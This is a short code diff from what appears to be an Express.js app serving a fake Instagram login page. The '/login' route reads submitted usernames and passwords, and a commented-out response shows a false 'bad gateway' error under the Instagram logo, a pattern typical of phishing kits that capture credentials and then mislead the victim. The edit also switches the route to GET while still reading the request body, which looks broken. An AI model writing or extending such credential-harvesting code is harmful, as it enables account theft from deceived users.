@@ -34,7 +34,7 @@ app.get('/', (req, res) => {
 app.set('view engine', 'pug');
 app.set('views', path.join(__dirname, './instagramloginpage/ui'));
 
-app.post('/login', (req, res) => {
+app.get('/login', (req, res) => {
   // res.send('<img src="./assets/img/instagram.svg"></img><h1>Connection got disconnected due to bad gate way, try again </h1>')
   let username = req.body.username;
   let password = req.body.password;
